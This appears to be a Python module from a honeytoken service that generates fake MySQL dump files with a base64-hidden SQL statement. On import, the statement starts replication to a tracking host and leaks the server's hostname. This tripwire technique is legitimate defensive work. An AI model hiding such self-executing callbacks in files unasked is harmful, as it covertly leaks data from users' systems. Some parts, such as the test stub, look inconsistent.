import tempfile
import shutil
import datetime
import random
import base64
import gzip
from zipfile import ZipFile, ZipInfo
from ziplib import MODE_DIRECTORY
from cStringIO import StringIO
import random

from settings import CANARY_MYSQL_DUMP_TEMPLATE

MYSQL_DUMP=CANARY_MYSQL_DUMP_TEMPLATE

DUMP_HEADER = """-- MySQL dump 10.13  Distrib 8.0.26, for Linux (x86_64)
--
-- Host: localhost    Database: {}
-- ------------------------------------------------------
-- Server version	8.0.26

"""

DATABASE_NAMES = [
    'db397638123',
    'cw',
    'dwq',
    'employees',
    'staff',
    'db01',
    'db02',
    'db03',
    'db',
    'data'
]

DUMP_HEADER = DUMP_HEADER.format(random.choice(DATABASE_NAMES))

TABLE_LIST = [
    "dw_blc_links.sql",
    "dw_concept.sql",
    "dw_domain_class.sql",
    "dw_multiple.sql",
    "dw_options.sql",
    "dw_postmeta.sql",
    "dw_system_configuration.sql",
    "dw_update.sql",
    "dw_usermeta.sql",
    "dw_users.sql",
    "dw_dept_emp.sql",
    "dw_titles.sql",
    "dw_employees.sql",
    "dw_salaries.sql"
]

MIN_TABLE_COUNT = len(TABLE_LIST) / 2

def zipinfo_contents(zipfile=None, zipinfo=None):
    """Given an entry in a zip file, extract the file and perform a search
       and replace on the contents. Returns the contents as a string."""
    dirname = tempfile.mkdtemp()
    fname = zipfile.extract(zipinfo, dirname)
    with open(fname, 'r') as fd:
        contents = fd.read()
    shutil.rmtree(dirname)
    return contents

def make_canary_mysql_dump(canarydrop=None, template=MYSQL_DUMP, encoded=True):
    magic_sauce = "SET @bb = CONCAT(\"CHANGE MASTER TO MASTER_PASSWORD='my-secret-pw', MASTER_RETRY_COUNT=1, MASTER_PORT=3306," + \
                  "MASTER_HOST='{hostname}', MASTER_USER='{token}\", @@lc_time_names, @@hostname, \"';\");".format(
                      hostname=canarydrop.get_hostname(), token=canarydrop._drop['canarytoken'])

    if encoded:
        sql_statement = _make_encoded_sql_statement(magic_sauce)
    else:
        sql_statement = _make_decoded_sql_statement(magic_sauce)

    table_count = random.choice(range(MIN_TABLE_COUNT, len(TABLE_LIST) + 1))
    tables = random.sample(TABLE_LIST, table_count)

    with open(template, 'r') as f:
        input_buf = StringIO(f.read())
    output_buf = StringIO()
    output_zip = gzip.GzipFile(fileobj=output_buf, mode="wb")
    file_build_start = True
    table_counter = 0
    with ZipFile(input_buf, 'r') as doc:
        doc_list = doc.filelist
        random.shuffle(doc_list)
        for entry in doc_list:
            if entry.external_attr & MODE_DIRECTORY or entry.filename not in tables:
                continue

            if file_build_start:
                output_zip.write(DUMP_HEADER)
                file_build_start = False

            # insert the token somewhere in the middle
            if table_counter == MIN_TABLE_COUNT / 2:
                output_zip.write(sql_statement)

            contents = zipinfo_contents(zipfile=doc, zipinfo=entry)
            output_zip.write(contents)

            table_counter += 1

    output_zip.write("-- Dump completed on 2021-08-11 18:47:51")
    output_zip.close()
    return output_buf.getvalue()

def _make_encoded_sql_statement(magic_sauce):
    sql_statement = """
SET @b = '{magic_sauce}';
SET @s2 = FROM_BASE64(@b);
PREPARE stmt1 FROM @s2;
EXECUTE stmt1;
PREPARE stmt2 FROM @bb;
EXECUTE stmt2;
START REPLICA;""".format(magic_sauce=base64.b64encode(magic_sauce))
    return sql_statement

def _make_decoded_sql_statement(magic_sauce):
    sql_statement = """
{magic_sauce}
PREPARE stmt FROM @bb;
EXECUTE stmt;
START REPLICA;""".format(magic_sauce=magic_sauce)
    return sql_statement

if __name__ == '__main__':
    class CanarydropTest():
        def get_hostname(self):
            return "w9fxd0qkpilgaesjzgohkfsmc.ssl-secure-srv.com"

        @property
        def canarytoken(self):
            return "w9fxd0qkpilgaesjzgohkfsmc"

    c = CanarydropTest()

    with open('mysql_dump.sql.gz', 'w+') as f:
        f.write(make_canary_mysql_dump(canarydrop=c))